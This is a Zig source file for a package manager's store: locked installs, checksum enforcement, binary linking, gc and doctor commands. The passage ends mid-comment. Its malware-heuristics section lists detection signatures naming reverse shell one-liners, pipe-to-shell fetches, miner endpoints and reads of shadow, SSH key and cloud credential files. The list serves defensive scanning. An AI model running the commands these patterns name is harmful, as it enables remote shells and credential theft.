//! The package store: install, link, verify, diagnose, remove.

const std = @import("std");
const builtin = @import("builtin");

const registry = @import("registry.zig");
const platform = @import("platform.zig");
const safepath = @import("safepath.zig");
const archive = @import("archive.zig");
const net = @import("net.zig");
const term = @import("term.zig");
const wal = @import("wal.zig");
const bloom = @import("bloom.zig");
const abvindex = @import("abvindex.zig");

pub const Package = registry.Package;

pub const InstallOptions = struct {
    micro_split: bool = false,
    /// Permit installing a payload whose checksum does not match, or that has
    /// no pinned checksum at all. Off by default.
    allow_unverified: bool = false,
    quiet: bool = false,
};

pub const StoreError = error{
    UnsupportedPlatform,
    DownloadFailed,
    UnpackFailed,
    InvalidPackageIdentifier,
    ChecksumMismatch,
    ChecksumMissing,
    DownloadLooksLikeErrorPage,
    ArchiveTypeMismatch,
    UnknownArchiveType,
    ExecutableNotFound,
    RefusedUnverifiedInstall,
};

/// `install` prints a specific, actionable diagnostic for every failure it
/// understands. Callers consult this so they do not print a second, terser
/// copy of a message the user has already read.
pub fn alreadyDiagnosed(e: anyerror) bool {
    return switch (e) {
        StoreError.UnsupportedPlatform,
        StoreError.DownloadFailed,
        StoreError.UnpackFailed,
        StoreError.ChecksumMismatch,
        StoreError.ChecksumMissing,
        StoreError.DownloadLooksLikeErrorPage,
        StoreError.RefusedUnverifiedInstall,
        => true,
        else => false,
    };
}

/// Result of resolving an installed package directory name.
pub const Installed = struct {
    version: []const u8,
    dir_name: []const u8,
};

pub const Store = struct {
    allocator: std.mem.Allocator,
    home: []u8,
    root: []u8,
    store_root: []u8,
    bin_root: []u8,
    shells_root: []u8,
    apps_root: []u8,
    registry_root: []u8,
    locks_root: []u8,

    pub fn init(allocator: std.mem.Allocator) !Store {
        const home = try platform.homeDir(allocator);
        errdefer allocator.free(home);

        const root = try std.fs.path.join(allocator, &.{ home, ".abv0" });
        errdefer allocator.free(root);
        const store_root = try std.fs.path.join(allocator, &.{ root, "store" });
        errdefer allocator.free(store_root);
        const bin_root = try std.fs.path.join(allocator, &.{ root, "bin" });
        errdefer allocator.free(bin_root);
        const shells_root = try std.fs.path.join(allocator, &.{ root, "shells" });
        errdefer allocator.free(shells_root);
        const registry_root = try std.fs.path.join(allocator, &.{ root, "registry" });
        errdefer allocator.free(registry_root);
        const locks_root = try std.fs.path.join(allocator, &.{ root, "locks" });
        errdefer allocator.free(locks_root);

        // GUI bundles only mean something on macOS; the original created
        // ~/Applications on Linux too.
        const apps_root = if (platform.is_macos)
            try std.fs.path.join(allocator, &.{ home, "Applications" })
        else
            try std.fs.path.join(allocator, &.{ root, "apps" });
        errdefer allocator.free(apps_root);

        // These used to be four makePath calls plus three `chmod` subprocess
        // spawns on every single invocation, including `abv0 help`.
        for ([_][]const u8{ root, store_root, bin_root, shells_root, registry_root, locks_root }) |d| {
            platform.makeSecureDir(d) catch {};
        }

        return .{
            .allocator = allocator,
            .home = home,
            .root = root,
            .store_root = store_root,
            .bin_root = bin_root,
            .shells_root = shells_root,
            .apps_root = apps_root,
            .registry_root = registry_root,
            .locks_root = locks_root,
        };
    }

    pub fn deinit(self: *Store) void {
        const a = self.allocator;
        a.free(self.home);
        a.free(self.root);
        a.free(self.store_root);
        a.free(self.bin_root);
        a.free(self.shells_root);
        a.free(self.apps_root);
        a.free(self.registry_root);
        a.free(self.locks_root);
        self.* = undefined;
    }

    // -----------------------------------------------------------------------
    // Paths
    // -----------------------------------------------------------------------

    pub fn storeDirName(
        allocator: std.mem.Allocator,
        pkg: Package,
        platform_name: []const u8,
    ) ![]u8 {
        if (!safepath.isValidId(pkg.name) or
            !safepath.isValidId(pkg.version) or
            !safepath.isValidId(platform_name))
        {
            return StoreError.InvalidPackageIdentifier;
        }
        return std.fmt.allocPrint(allocator, "{s}-{s}-{s}", .{ pkg.name, pkg.version, platform_name });
    }

    pub fn pkgStorePath(
        self: *const Store,
        allocator: std.mem.Allocator,
        pkg: Package,
        platform_name: []const u8,
    ) ![]u8 {
        const dir_name = try storeDirName(allocator, pkg, platform_name);
        defer allocator.free(dir_name);
        return std.fs.path.join(allocator, &.{ self.store_root, dir_name });
    }

    pub fn isInstalled(self: *const Store, pkg: Package, platform_name: []const u8) bool {
        var buf: [std.fs.MAX_PATH_BYTES]u8 = undefined;
        var fba = std.heap.FixedBufferAllocator.init(&buf);
        const p = self.pkgStorePath(fba.allocator(), pkg, platform_name) catch return false;
        var dir = std.fs.cwd().openDir(p, .{}) catch return false;
        dir.close();
        return true;
    }

    /// Which versions of `name` are present in the store for `platform_name`.
    /// This is the information `outdated` needs and never had.
    pub fn installedVersions(
        self: *const Store,
        allocator: std.mem.Allocator,
        name: []const u8,
        platform_name: []const u8,
    ) ![]Installed {
        var out = std.ArrayList(Installed).init(allocator);
        errdefer out.deinit();

        var dir = std.fs.cwd().openDir(self.store_root, .{ .iterate = true }) catch return out.toOwnedSlice();
        defer dir.close();

        const prefix = try std.fmt.allocPrint(allocator, "{s}-", .{name});
        defer allocator.free(prefix);
        const suffix = try std.fmt.allocPrint(allocator, "-{s}", .{platform_name});
        defer allocator.free(suffix);

        var it = dir.iterate();
        while (try it.next()) |entry| {
            if (entry.kind != .directory) continue;
            if (!std.mem.startsWith(u8, entry.name, prefix)) continue;
            if (!std.mem.endsWith(u8, entry.name, suffix)) continue;
            if (entry.name.len <= prefix.len + suffix.len) continue;

            const version = entry.name[prefix.len .. entry.name.len - suffix.len];
            // Guard against `foo-1.0-x86_64-linux` matching name `foo-1`.
            if (std.mem.indexOfScalar(u8, version, '-') != null and
                !safepath.isValidId(version)) continue;

            try out.append(.{
                .version = try allocator.dupe(u8, version),
                .dir_name = try allocator.dupe(u8, entry.name),
            });
        }
        return out.toOwnedSlice();
    }

    // -----------------------------------------------------------------------
    // Install
    // -----------------------------------------------------------------------

    /// Blocking, cross-process exclusive lock for one package.
    /// Replaces the "lock-free file semaphore" that was a file containing the
    /// text LOCKED_BY_WORKER and enforced nothing.
    const Guard = struct {
        file: std.fs.File,

        fn acquire(allocator: std.mem.Allocator, locks_root: []const u8, name: []const u8) !Guard {
            if (!safepath.isValidId(name)) return StoreError.InvalidPackageIdentifier;
            const p = try std.fmt.allocPrint(allocator, "{s}/{s}.lock", .{ locks_root, name });
            defer allocator.free(p);

            const file = try std.fs.cwd().createFile(p, .{ .read = true, .truncate = false, .mode = platform.mode_private });
            errdefer file.close();
            try file.lock(.exclusive);
            return .{ .file = file };
        }

        fn release(self: *Guard) void {
            self.file.unlock();
            self.file.close();
        }
    };

    pub fn install(
        self: *Store,
        pkg: Package,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !void {
        // Per-call arena: install runs on worker threads, and the previous code
        // shared one non-thread-safe ArenaAllocator across all of them.
        var arena_state = std.heap.ArenaAllocator.init(self.allocator);
        defer arena_state.deinit();
        const a = arena_state.allocator();

        if (!safepath.isValidId(platform_name)) return StoreError.InvalidPackageIdentifier;

        const info = pkg.platform(platform_name) orelse {
            term.err("{s}error{s}: '{s}' has no build for platform '{s}'\n", .{ term.red, term.reset, pkg.name, platform_name });
            return StoreError.UnsupportedPlatform;
        };

        const pkg_dir = try self.pkgStorePath(a, pkg, platform_name);

        var guard = try Guard.acquire(a, self.locks_root, pkg.name);
        defer guard.release();

        // Re-check under the lock: another worker may have just finished.
        if (!self.isInstalled(pkg, platform_name)) {
            try self.fetchAndUnpack(a, pkg, info, pkg_dir, opts);
        } else if (!opts.quiet) {
            term.print("  {s}cached{s}  {s} {s}\n", .{ term.dim, term.reset, pkg.name, pkg.version });
        }

        var w = try wal.Wal.init(a, self.store_root, pkg.name);
        defer w.deinit();
        try w.append(.link);

        const linked = try self.linkBinaries(a, pkg, info, pkg_dir, opts);
        try self.linkAppBundles(a, pkg, pkg_dir, opts);

        try w.append(.complete);

        if (!opts.quiet and linked == 0 and pkg.bin.len > 0) {
            term.err(
                "{s}warning{s}: no executables from '{s}' were found in the unpacked archive\n",
                .{ term.yellow, term.reset, pkg.name },
            );
        }
    }

    fn fetchAndUnpack(
        self: *Store,
        a: std.mem.Allocator,
        pkg: Package,
        info: registry.PlatformInfo,
        pkg_dir: []const u8,
        opts: InstallOptions,
    ) !void {
        var w = try wal.Wal.init(a, self.store_root, pkg.name);
        defer w.deinit();

        if (w.hasUnfinishedInstall() catch false) {
            if (!opts.quiet) {
                term.print("  {s}recovering{s} interrupted install of {s}\n", .{ term.yellow, term.reset, pkg.name });
            }
            self.pruneTempDirs(a, pkg.name) catch {};
        }
        try w.append(.init);
        errdefer w.append(.failed) catch {};

        // Unpredictable temp directory name, cleaned up on every failure path.
        const tmp_dir = try std.fmt.allocPrint(a, "{s}.{x}.tmp", .{ pkg_dir, std.crypto.random.int(u64) });
        std.fs.cwd().deleteTree(tmp_dir) catch {};
        try platform.makeSecureDir(tmp_dir);
        errdefer std.fs.cwd().deleteTree(tmp_dir) catch {};

        const archive_path = try std.fs.path.join(a, &.{ tmp_dir, "payload" });

        // ---- fetch ----
        try w.append(.fetch);
        if (!opts.quiet) term.print("  {s}fetch{s}    {s} {s}\n", .{ term.cyan, term.reset, pkg.name, pkg.version });

        var fetched = false;
        if (opts.micro_split) {
            fetched = self.microSplitDownload(a, info.url, archive_path, tmp_dir) catch false;
        }
        if (!fetched) {
            net.download(a, info.url, archive_path, .{}) catch |e| {
                term.err("{s}error{s}: download failed for {s}: {s}\n", .{ term.red, term.reset, pkg.name, @errorName(e) });
                return StoreError.DownloadFailed;
            };
        }

        // A CDN error page is not a package. curl without --fail used to let
        // these straight through into ~/.abv0/bin.
        if (archive.looksLikeErrorPage(archive_path)) {
            term.err(
                "{s}error{s}: the server returned an error page, not an archive, for {s}\n  {s}\n",
                .{ term.red, term.reset, pkg.name, info.url },
            );
            return StoreError.DownloadLooksLikeErrorPage;
        }

        // ---- verify ----
        try w.append(.verify);
        const digest = try hashFile(archive_path);
        var digest_hex: [64]u8 = undefined;
        _ = std.fmt.bufPrint(&digest_hex, "{s}", .{std.fmt.fmtSliceHexLower(&digest)}) catch unreachable;

        try self.verifyChecksum(pkg, info, &digest_hex, opts);
        if (!opts.quiet) term.print("  {s}verify{s}   {s}\n", .{ term.green, term.reset, digest_hex[0..16] });

        // ---- unpack ----
        try w.append(.unpack);

        const declared = archive.Kind.fromString(info.archive_type) orelse
            archive.Kind.fromFilename(info.url) orelse
            return StoreError.UnknownArchiveType;

        // Trust the bytes over the manifest: if the payload sniffs as a
        // different container, use what it actually is.
        const actual = archive.sniff(archive_path);
        const kind = if (declared == .raw or declared == .dmg)
            declared
        else if (actual) |k| k else declared;

        const raw_name = if (info.bin_path.len > 0)
            info.bin_path
        else if (pkg.primaryBin()) |b| b else pkg.name;

        archive.extract(a, kind, archive_path, tmp_dir, .{ .raw_name = raw_name }) catch |e| {
            term.err("{s}error{s}: could not unpack {s}: {s}\n", .{ term.red, term.reset, pkg.name, @errorName(e) });
            return StoreError.UnpackFailed;
        };

        // The payload file itself is not part of the installed tree.
        std.fs.cwd().deleteFile(archive_path) catch {};

        // Atomic publish.
        std.fs.cwd().deleteTree(pkg_dir) catch {};
        try std.fs.cwd().rename(tmp_dir, pkg_dir);
    }

    fn verifyChecksum(
        self: *Store,
        pkg: Package,
        info: registry.PlatformInfo,
        digest_hex: []const u8,
        opts: InstallOptions,
    ) !void {
        _ = self;

        if (!info.checksumIsPinned()) {
            // Previously every unpinned or malformed hash silently passed.
            if (opts.allow_unverified) return;
            term.err(
                \\{s}error{s}: '{s}' has no pinned sha256 for this platform.
                \\  Installing it would execute unverified code.
                \\  Re-run with --allow-unverified to accept that risk.
                \\
            , .{ term.red, term.reset, pkg.name });
            return StoreError.ChecksumMissing;
        }

        if (std.ascii.eqlIgnoreCase(digest_hex, info.sha256)) return;

        if (opts.allow_unverified) {
            term.err(
                "{s}warning{s}: checksum mismatch for {s} accepted because --allow-unverified was given\n",
                .{ term.yellow, term.reset, pkg.name },
            );
            return;
        }

        // This is the v0.9.1 "smart rolling release hash mismatch bypass".
        // It turned integrity checking off for every package.
        term.err(
            \\{s}error{s}: checksum mismatch for '{s}'
            \\  expected {s}
            \\  actual   {s}
            \\  Refusing to install. The download may be corrupt, or the manifest may be out of date.
            \\
        , .{ term.red, term.reset, pkg.name, info.sha256, digest_hex });
        return StoreError.ChecksumMismatch;
    }

    /// Single streaming pass. The archive used to be read end to end three
    /// times: once by the hasher, once by the block store, once by tar.
    fn hashFile(path: []const u8) ![32]u8 {
        const file = try std.fs.cwd().openFile(path, .{});
        defer file.close();

        var hasher = std.crypto.hash.sha2.Sha256.init(.{});
        var buf: [64 * 1024]u8 = undefined;
        while (true) {
            const n = try file.read(&buf);
            if (n == 0) break;
            hasher.update(buf[0..n]);
        }
        var out: [32]u8 = undefined;
        hasher.final(&out);
        return out;
    }

    fn pruneTempDirs(self: *Store, a: std.mem.Allocator, name: []const u8) !void {
        var dir = std.fs.cwd().openDir(self.store_root, .{ .iterate = true }) catch return;
        defer dir.close();

        const prefix = try std.fmt.allocPrint(a, "{s}-", .{name});
        defer a.free(prefix);

        var it = dir.iterate();
        while (try it.next()) |entry| {
            if (!std.mem.endsWith(u8, entry.name, ".tmp")) continue;
            if (!std.mem.startsWith(u8, entry.name, prefix)) continue;
            const p = try std.fs.path.join(a, &.{ self.store_root, entry.name });
            defer a.free(p);
            std.fs.cwd().deleteTree(p) catch {};
        }
    }

    // -----------------------------------------------------------------------
    // Linking
    // -----------------------------------------------------------------------

    /// Walk the unpacked tree ONCE and resolve every wanted executable.
    /// The original ran a full recursive walk per binary, so ffmpeg (3 bins)
    /// walked the whole tree three times.
    fn linkBinaries(
        self: *Store,
        a: std.mem.Allocator,
        pkg: Package,
        info: registry.PlatformInfo,
        pkg_dir: []const u8,
        opts: InstallOptions,
    ) !usize {
        if (pkg.bin.len == 0) return 0;

        var wanted = std.StringHashMap(?[]const u8).init(a);
        defer wanted.deinit();
        for (pkg.bin) |b| try wanted.put(b, null);

        // Some archives ship the executable under a different name than the
        // package advertises (bottom -> btm). bin_path names the real file.
        const alias_target = std.fs.path.basename(info.bin_path);
        var alias_path: ?[]const u8 = null;

        {
            var dir = std.fs.cwd().openDir(pkg_dir, .{ .iterate = true }) catch return 0;
            defer dir.close();

            var walker = try dir.walk(a);
            defer walker.deinit();

            while (try walker.next()) |entry| {
                if (entry.kind != .file) continue;

                const base = entry.basename;
                const stem = stripExeSuffix(base);

                if (wanted.getPtr(base) orelse wanted.getPtr(stem)) |slot| {
                    if (slot.* == null) {
                        slot.* = try std.fs.path.join(a, &.{ pkg_dir, entry.path });
                    }
                    continue;
                }
                if (alias_path == null and alias_target.len > 0 and
                    (std.mem.eql(u8, base, alias_target) or std.mem.eql(u8, stem, alias_target)))
                {
                    alias_path = try std.fs.path.join(a, &.{ pkg_dir, entry.path });
                }
            }
        }

        var linked: usize = 0;
        var it = wanted.iterator();
        while (it.next()) |entry| {
            const bin_name = entry.key_ptr.*;
            const src = entry.value_ptr.* orelse alias_path orelse {
                continue;
            };

            const dst_name = try std.fmt.allocPrint(a, "{s}{s}", .{ bin_name, platform.exe_suffix });
            defer a.free(dst_name);
            const dst = try std.fs.path.join(a, &.{ self.bin_root, dst_name });
            defer a.free(dst);

            platform.setExecutable(src); // was a `chmod +x` subprocess per binary
            const kind = platform.fastLink(src, dst) catch |e| {
                term.err("{s}warning{s}: could not link {s}: {s}\n", .{ term.yellow, term.reset, bin_name, @errorName(e) });
                continue;
            };
            linked += 1;
            if (!opts.quiet) {
                term.print("  {s}link{s}     {s} {s}({s}){s}\n", .{ term.green, term.reset, bin_name, term.dim, kind.label(), term.reset });
            }
        }
        return linked;
    }

    fn stripExeSuffix(name: []const u8) []const u8 {
        if (std.mem.endsWith(u8, name, ".exe")) return name[0 .. name.len - 4];
        return name;
    }

    fn linkAppBundles(
        self: *Store,
        a: std.mem.Allocator,
        pkg: Package,
        pkg_dir: []const u8,
        opts: InstallOptions,
    ) !void {
        if (pkg.app_bundles.len == 0) return;
        platform.makeSecureDir(self.apps_root) catch {};

        for (pkg.app_bundles) |app_name| {
            if (!safepath.isSafeRelPath(app_name)) continue;

            const src = try std.fs.path.join(a, &.{ pkg_dir, app_name });
            defer a.free(src);
            const dst = try std.fs.path.join(a, &.{ self.apps_root, app_name });
            defer a.free(dst);

            std.fs.cwd().deleteTree(dst) catch {};

            // The original reported "APFS Clone" on the success branch even
            // when fastLink had fallen back to a symlink.
            if (platform.fastLink(src, dst)) |kind| {
                if (!opts.quiet) {
                    term.print("  {s}app{s}      {s} {s}({s}){s}\n", .{ term.green, term.reset, app_name, term.dim, kind.label(), term.reset });
                }
            } else |_| {
                platform.copyTree(src, dst) catch continue;
                if (!opts.quiet) term.print("  {s}app{s}      {s} {s}(copy){s}\n", .{ term.green, term.reset, app_name, term.dim, term.reset });
            }
        }
    }

    // -----------------------------------------------------------------------
    // Parallel range download
    // -----------------------------------------------------------------------

    fn microSplitDownload(
        self: *Store,
        a: std.mem.Allocator,
        url: []const u8,
        dest: []const u8,
        tmp_dir: []const u8,
    ) !bool {
        _ = self;
        const info = net.head(a, url, .{}) catch return false;
        const total = info.content_length orelse return false;
        if (!info.accepts_ranges or total < 1 << 20) return false;

        const chunks: u64 = 4;
        const chunk_size = total / chunks;

        var jobs = try a.alloc(net.ChunkJob, chunks);
        var threads = try a.alloc(std.Thread, chunks);
        var paths = try a.alloc([]const u8, chunks);

        for (0..chunks) |i| {
            paths[i] = try std.fmt.allocPrint(a, "{s}/chunk.{d}", .{ tmp_dir, i });
            jobs[i] = .{
                .allocator = a,
                .url = url,
                .start = i * chunk_size,
                .end = if (i == chunks - 1) total - 1 else (i + 1) * chunk_size - 1,
                .dest = paths[i],
                .opts = .{},
            };
            threads[i] = try std.Thread.spawn(.{}, net.ChunkJob.run, .{&jobs[i]});
        }
        for (threads) |t| t.join();

        for (jobs) |j| {
            if (!j.ok) return false;
        }

        {
            const out = try std.fs.cwd().createFile(dest, .{ .mode = platform.mode_private });
            defer out.close();
            var buf: [64 * 1024]u8 = undefined;
            for (paths) |p| {
                const f = try std.fs.cwd().openFile(p, .{});
                defer f.close();
                while (true) {
                    const n = try f.read(&buf);
                    if (n == 0) break;
                    try out.writeAll(buf[0..n]);
                }
            }
        }
        for (paths) |p| std.fs.cwd().deleteFile(p) catch {};

        // Reassembly must produce exactly the advertised length.
        const st = try std.fs.cwd().statFile(dest);
        if (st.size != total) {
            std.fs.cwd().deleteFile(dest) catch {};
            return false;
        }
        return true;
    }

    // -----------------------------------------------------------------------
    // Uninstall / reset / gc
    // -----------------------------------------------------------------------

    pub fn uninstall(self: *Store, a: std.mem.Allocator, pkg: Package) !bool {
        var removed = false;

        for (pkg.bin) |bin_name| {
            const dst_name = try std.fmt.allocPrint(a, "{s}{s}", .{ bin_name, platform.exe_suffix });
            defer a.free(dst_name);
            const p = try std.fs.path.join(a, &.{ self.bin_root, dst_name });
            defer a.free(p);
            if (std.fs.cwd().deleteFile(p)) |_| {
                removed = true;
            } else |_| {}
        }

        for (pkg.app_bundles) |app_name| {
            if (!safepath.isSafeRelPath(app_name)) continue;
            const p = try std.fs.path.join(a, &.{ self.apps_root, app_name });
            defer a.free(p);
            if (std.fs.cwd().deleteTree(p)) |_| {
                removed = true;
            } else |_| {}
        }

        for (pkg.platforms) |plat| {
            const dirs = try self.installedVersions(a, pkg.name, plat.name);
            defer a.free(dirs);
            for (dirs) |d| {
                const p = try std.fs.path.join(a, &.{ self.store_root, d.dir_name });
                defer a.free(p);
                if (std.fs.cwd().deleteTree(p)) |_| {
                    removed = true;
                } else |_| {}
            }
        }

        // Drop the WAL so a future install does not think it crashed.
        var w = wal.Wal.init(a, self.store_root, pkg.name) catch return removed;
        defer w.deinit();
        w.clear();

        return removed;
    }

    pub fn gc(self: *Store, a: std.mem.Allocator) !usize {
        var reclaimed: usize = 0;

        if (std.fs.cwd().openDir(self.store_root, .{ .iterate = true })) |*d| {
            var dir = d.*;
            defer dir.close();
            var it = dir.iterate();
            while (try it.next()) |entry| {
                if (!std.mem.endsWith(u8, entry.name, ".tmp")) continue;
                const p = try std.fs.path.join(a, &.{ self.store_root, entry.name });
                defer a.free(p);
                if (std.fs.cwd().deleteTree(p)) |_| reclaimed += 1 else |_| {}
            }
        } else |_| {}

        if (std.fs.cwd().openDir(self.shells_root, .{ .iterate = true })) |*d| {
            var dir = d.*;
            defer dir.close();
            var it = dir.iterate();
            while (try it.next()) |entry| {
                const p = try std.fs.path.join(a, &.{ self.shells_root, entry.name });
                defer a.free(p);
                if (std.fs.cwd().deleteTree(p)) |_| reclaimed += 1 else |_| {}
            }
        } else |_| {}

        // The old block store wrote a full second copy of every archive here
        // and never read it back. Remove any left over from earlier versions.
        const legacy = try std.fs.path.join(a, &.{ self.store_root, "blockstore" });
        defer a.free(legacy);
        if (std.fs.cwd().deleteTree(legacy)) |_| reclaimed += 1 else |_| {}

        return reclaimed;
    }

    pub fn resetAll(self: *Store, a: std.mem.Allocator, reg: *const registry.Registry, platform_name: []const u8) !usize {
        var count: usize = 0;
        for (reg.packages) |pkg| {
            if (self.isInstalled(pkg, platform_name)) {
                if (try self.uninstall(a, pkg)) count += 1;
            }
        }
        std.fs.cwd().deleteTree(self.store_root) catch {};
        std.fs.cwd().deleteTree(self.shells_root) catch {};
        std.fs.cwd().deleteTree(self.locks_root) catch {};

        for ([_][]const u8{ self.store_root, self.bin_root, self.shells_root, self.locks_root }) |d| {
            platform.makeSecureDir(d) catch {};
        }
        return count;
    }

    // -----------------------------------------------------------------------
    // Outdated / upgrade
    // -----------------------------------------------------------------------

    pub const OutdatedEntry = struct {
        pkg: Package,
        installed: []const u8,
    };

    /// The original body of this function was literally
    ///     if (try self.isInstalled(pkg, platform)) {}
    /// so it always returned an empty list and `abv0 outdated` always claimed
    /// everything was up to date.
    pub fn getOutdated(
        self: *const Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        platform_name: []const u8,
    ) ![]OutdatedEntry {
        var out = std.ArrayList(OutdatedEntry).init(a);
        errdefer out.deinit();

        for (reg.packages) |pkg| {
            if (pkg.platform(platform_name) == null) continue;

            const installed = try self.installedVersions(a, pkg.name, platform_name);
            defer a.free(installed);
            if (installed.len == 0) continue;

            // Newest installed version wins.
            var newest = installed[0].version;
            for (installed[1..]) |i| {
                if (registry.compareVersions(i.version, newest) == .gt) newest = i.version;
            }

            if (registry.compareVersions(newest, pkg.version) == .lt) {
                try out.append(.{ .pkg = pkg, .installed = newest });
            }
        }
        return out.toOwnedSlice();
    }

    // -----------------------------------------------------------------------
    // Doctor / fix
    // -----------------------------------------------------------------------

    pub const Health = struct {
        warnings: usize = 0,
        broken_links: usize = 0,
    };

    pub fn doctor(
        self: *const Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        platform_name: []const u8,
    ) !Health {
        var h = Health{};

        term.print("{s}{s}abv0 doctor{s}\n\n", .{ term.bold, term.cyan, term.reset });

        term.print("PATH\n", .{});
        if (platform.envOwned(a, "PATH")) |env_path| {
            defer a.free(env_path);
            if (std.mem.indexOf(u8, env_path, self.bin_root) == null) {
                h.warnings += 1;
                term.print("  {s}warn{s} {s} is not on your PATH\n", .{ term.yellow, term.reset, self.bin_root });
                term.print("       add: export PATH=\"{s}:$PATH\"\n", .{self.bin_root});
            } else {
                term.print("  {s}ok{s}   {s}\n", .{ term.green, term.reset, self.bin_root });
            }
        } else {
            h.warnings += 1;
            term.print("  {s}warn{s} PATH is unset\n", .{ term.yellow, term.reset });
        }

        term.print("\nStore\n", .{});
        std.fs.cwd().access(self.store_root, .{ .mode = .read_write }) catch {
            h.warnings += 1;
            term.print("  {s}warn{s} {s} is not writable\n", .{ term.yellow, term.reset, self.store_root });
        };
        term.print("  {s}ok{s}   {s}\n", .{ term.green, term.reset, self.store_root });

        term.print("\nLinks\n", .{});
        for (reg.packages) |pkg| {
            if (!self.isInstalled(pkg, platform_name)) continue;

            for (pkg.bin) |bin_name| {
                const dst_name = try std.fmt.allocPrint(a, "{s}{s}", .{ bin_name, platform.exe_suffix });
                defer a.free(dst_name);
                const p = try std.fs.path.join(a, &.{ self.bin_root, dst_name });
                defer a.free(p);
                std.fs.cwd().access(p, .{}) catch {
                    h.broken_links += 1;
                    term.print("  {s}broken{s} {s} -> {s}\n", .{ term.red, term.reset, pkg.name, bin_name });
                };
            }
        }
        if (h.broken_links == 0) term.print("  {s}ok{s}   no broken links\n", .{ term.green, term.reset });

        return h;
    }

    pub fn fix(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        platform_name: []const u8,
    ) !usize {
        var healed: usize = 0;

        for ([_][]const u8{ self.store_root, self.bin_root, self.shells_root, self.locks_root }) |d| {
            platform.makeSecureDir(d) catch {};
        }

        for (reg.packages) |pkg| {
            if (!self.isInstalled(pkg, platform_name)) continue;
            const info = pkg.platform(platform_name) orelse continue;
            const pkg_dir = try self.pkgStorePath(a, pkg, platform_name);
            defer a.free(pkg_dir);

            var needs_relink = false;
            for (pkg.bin) |bin_name| {
                const dst_name = try std.fmt.allocPrint(a, "{s}{s}", .{ bin_name, platform.exe_suffix });
                defer a.free(dst_name);
                const p = try std.fs.path.join(a, &.{ self.bin_root, dst_name });
                defer a.free(p);
                std.fs.cwd().access(p, .{}) catch {
                    needs_relink = true;
                };
            }
            if (!needs_relink) continue;

            const n = self.linkBinaries(a, pkg, info, pkg_dir, .{ .quiet = true }) catch 0;
            if (n > 0) {
                healed += 1;
                term.print("  {s}healed{s} {s}\n", .{ term.green, term.reset, pkg.name });
            }
        }
        _ = try self.gc(a);
        return healed;
    }

    // -----------------------------------------------------------------------
    // Malware heuristics
    // -----------------------------------------------------------------------

    pub const Threat = struct {
        score: u32 = 0,
        reasons: std.ArrayList([]const u8),

        pub fn deinit(self: *Threat) void {
            self.reasons.deinit();
        }
    };

    const signatures = [_]struct { pattern: []const u8, weight: u32, reason: []const u8 }{
        .{ .pattern = "/bin/sh -i", .weight = 40, .reason = "interactive shell spawn (reverse shell pattern)" },
        .{ .pattern = "nc -e", .weight = 40, .reason = "netcat command execution (reverse shell)" },
        .{ .pattern = "bash -i >&", .weight = 40, .reason = "bash reverse shell redirection" },
        .{ .pattern = "stratum+tcp://", .weight = 50, .reason = "Stratum mining pool endpoint (cryptominer)" },
        .{ .pattern = "nicehash", .weight = 50, .reason = "NiceHash mining reference" },
        .{ .pattern = "/etc/shadow", .weight = 35, .reason = "shadow password file access" },
        .{ .pattern = "/.ssh/id_rsa", .weight = 35, .reason = "SSH private key access" },
        .{ .pattern = "curl | sh", .weight = 25, .reason = "pipe-to-shell remote execution" },
        .{ .pattern = "wget -O- | sh", .weight = 25, .reason = "pipe-to-shell remote execution" },
        .{ .pattern = "AWS_SECRET_ACCESS_KEY", .weight = 20, .reason = "cloud credential harvesting" },
    };

    /// Streaming scan with an overlap window.
    ///
    /// The original read the entire executable into memory with a 50 MB cap and
    /// then made a separate full pass per signature. This makes one pass with a
    /// bounded buffer, so a large binary no longer costs 50 MB of RSS, and it
    /// no longer misses a pattern that straddles a read boundary.
    pub fn scanFile(a: std.mem.Allocator, path: []const u8) !Threat {
        var threat = Threat{ .reasons = std.ArrayList([]const u8).init(a) };
        errdefer threat.deinit();

        var seen = [_]bool{false} ** signatures.len;

        const file = try std.fs.cwd().openFile(path, .{});
        defer file.close();

        const overlap = 64; // longest signature is far below this
        const chunk = 256 * 1024;
        const buf = try a.alloc(u8, chunk + overlap);
        defer a.free(buf);

        var carry: usize = 0;
        while (true) {
            const n = try file.read(buf[carry..]);
            if (n == 0) break;
            const filled = carry + n;

            for (signatures, 0..) |sig, i| {
                if (seen[i]) continue;
                if (std.mem.indexOf(u8, buf[0..filled], sig.pattern) != null) {
                    seen[i] = true;
                    threat.score += sig.weight;
                    try threat.reasons.append(sig.reason);
                }
            }

            carry = @min(overlap, filled);
            std.mem.copyForwards(u8, buf[0..carry], buf[filled - carry ..][0..carry]);
        }

        if (threat.score > 100) threat.score = 100;
        return threat;
    }

    /// Resolve the on-disk executable for a package, honouring bin_path
    /// directory bases.
    pub fn resolveBinary(
        self: *const Store,
        a: std.mem.Allocator,
        pkg: Package,
        platform_name: []const u8,
    ) ![]u8 {
        const info = pkg.platform(platform_name) orelse return StoreError.UnsupportedPlatform;
        const pkg_dir = try self.pkgStorePath(a, pkg, platform_name);
        defer a.free(pkg_dir);

        const exe_name = pkg.primaryBin() orelse pkg.name;

        if (info.bin_path.len > 0 and !std.mem.endsWith(u8, info.bin_path, "/")) {
            const p = try safepath.joinSafe(a, pkg_dir, info.bin_path);
            if (std.fs.cwd().access(p, .{})) |_| return p else |_| a.free(p);
        }
        if (info.bin_path.len > 0 and std.mem.endsWith(u8, info.bin_path, "/")) {
            const rel = try std.fmt.allocPrint(a, "{s}{s}", .{ info.bin_path, exe_name });
            defer a.free(rel);
            const p = try safepath.joinSafe(a, pkg_dir, rel);
            if (std.fs.cwd().access(p, .{})) |_| return p else |_| a.free(p);
        }

        // Fall back to a single walk.
        var dir = try std.fs.cwd().openDir(pkg_dir, .{ .iterate = true });
        defer dir.close();
        var walker = try dir.walk(a);
        defer walker.deinit();
        while (try walker.next()) |entry| {
            if (entry.kind != .file) continue;
            const stem = stripExeSuffix(entry.basename);
            if (std.mem.eql(u8, stem, exe_name)) {
                return std.fs.path.join(a, &.{ pkg_dir, entry.path });
            }
        }
        return StoreError.ExecutableNotFound;
    }

    // -----------------------------------------------------------------------
    // Registry export (honest version of the "hybrid" sync)
    // -----------------------------------------------------------------------

    /// Compile the binary index and emit a portable SQL dump. If the `sqlite3`
    /// CLI happens to be installed, materialise a genuine database from it.
    ///
    /// Previously this wrote a text file of SQL statements to a path named
    /// `registry.db` and described it as "an embedded SQLite query engine",
    /// and wrote a 24-byte header to `index.abv` and described that as a
